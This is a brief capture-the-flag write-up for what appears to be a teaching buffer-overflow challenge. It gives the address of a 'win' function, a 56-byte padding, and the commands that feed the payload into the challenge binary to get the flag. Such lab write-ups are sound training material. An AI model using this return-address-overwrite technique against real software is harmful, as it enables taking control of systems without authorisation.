The address of the function `win` is `0x40223f`. You can find it with `objdump`.

As mentioned in the challenge, the padding should be 56 bytes and the payload is the address of the function `win`.

These commands will lead you to the flag.
```
./run.py
(echo "64"; cat payload; cat) | /babymem_level3_teaching1
```
